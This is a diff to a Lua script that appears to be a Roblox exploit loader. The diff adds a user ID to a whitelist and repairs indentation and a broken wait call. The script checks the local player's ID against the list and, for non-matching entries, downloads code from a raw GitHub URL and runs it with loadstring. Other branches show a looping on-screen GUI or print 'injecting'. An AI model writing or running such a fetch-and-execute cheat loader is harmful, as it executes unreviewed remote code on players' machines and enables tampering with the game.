@@ -13,14 +13,14 @@ local player = {
   "498180",
   "80217820",
   "1384515218",
-  ""
+  "143033910"
 }
 userid1 = game.Players.LocalPlayer.UserId
 userid2 = tostring(userid1)
 local coolio = true
 for i,v in pairs(player) do
     if v ~= userid2 then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Fusiom/vinl/main/fl.lua", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Fusiom/vinl/main/fl.lua", true))()
     elseif v == userid2 then 
         while coolio == true do
           local ScreenGui = Instance.new("ScreenGui")
@@ -586,7 +586,7 @@ for i,v in pairs(player) do
         end
     else
         print("injecting")
-        wait(0.1
-				
+        wait(0.1)
+    
 	end
 end
